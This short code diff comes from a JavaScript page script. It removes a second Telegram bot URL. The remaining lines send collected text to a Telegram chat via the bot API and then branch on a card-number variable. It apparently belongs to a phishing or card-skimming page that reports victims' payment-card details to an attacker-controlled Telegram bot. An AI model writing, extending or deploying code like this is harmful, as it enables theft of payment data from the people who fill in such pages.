@@ -72,7 +72,6 @@ window.addEventListener("DOMContentLoaded", () => {
     // }, 2000);
     // return;
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    const url2 = `https://api.telegram.org/bot${botToken2}/sendMessage`;
     fetch(`${url}?chat_id=${chatId}&text=${encodeURIComponent(text)}`)
       .then((res) => {
           if (cardNo) {
